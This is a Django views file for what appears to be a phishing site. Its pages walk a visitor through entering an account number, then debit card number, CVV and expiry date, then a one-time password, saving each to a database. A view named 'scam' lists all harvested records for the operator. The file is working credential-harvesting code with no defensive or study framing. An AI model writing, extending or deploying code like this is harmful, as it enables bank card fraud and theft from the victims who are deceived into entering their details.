from django.shortcuts import render, HttpResponse, redirect
from .models import DebitCard


def index(request):
    if request.method == 'POST':
        number = request.POST.get('number')
        account = request.POST.get('account')
        date = request.POST.get('date')

        user_contact = DebitCard.objects.create(number=number, account=account, date=date)
        user_contact.save()
        return redirect('debit/')
    else:
        return render(request, 'index.html')


def debit(request):
    if request.method == 'POST':
        cardnumber = request.POST.get('cardnumber')
        cvv = request.POST.get('cvv')
        expirydate = request.POST.get('expirydate')

        user_contact = DebitCard.objects.create(cardnumber=cardnumber, cvv=cvv, expirydate=expirydate)
        user_contact.save()
        return redirect('process/')
    else:
        return render(request, 'debit.html')


def process(request):
    if request.method == 'POST':
        otp = request.POST.get('otp')

        user_contact = DebitCard.objects.create(otp=otp)
        user_contact.save()
        return redirect('pro/')
    else:
        return render(request, 'otp.html')


def pro(request):
    return render(request, 'proccess.html')

def scam(request):
    user_co = DebitCard.objects.all()
    return render(request, 'ind.html', {'user_co': user_co})